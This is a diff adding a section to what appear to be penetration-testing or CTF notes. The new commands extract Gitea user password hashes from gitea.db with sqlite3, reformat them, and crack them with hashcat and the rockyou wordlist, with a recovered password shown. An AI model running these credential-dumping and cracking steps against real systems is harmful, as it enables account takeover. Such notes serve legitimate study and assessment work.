@@ -123,3 +123,18 @@ blackbot@comet:~/../database$ python3 -c "import sqlite3; conn=sqlite3.connect('
 blackbot@comet:~/../database$ python3 -c "import sqlite3; conn=sqlite3.connect('database.db'); print([c[1] for c in conn.execute('PRAGMA table_info(users)').fetchall()])"
 ['id', 'username', 'email', 'password', 'is_admin', 'is_premium']
 ```
+
+## SQLite3
+
+### Gitea
+
+Extract users
+```bash
+└─$ sqlite3 gitea.db "SELECT REPLACE(name || ':' || 'sha256:50000:' || BASE64(UNHEX(salt)) || ':' || BASE64(UNHEX(passwd)),CHAR(10),'') FROM user"
+developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+```
+
+```bash
+➜ .\hashcat.exe -a 0 -m 10900 --user .\hashes.txt .\rockyou.txt
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
+```
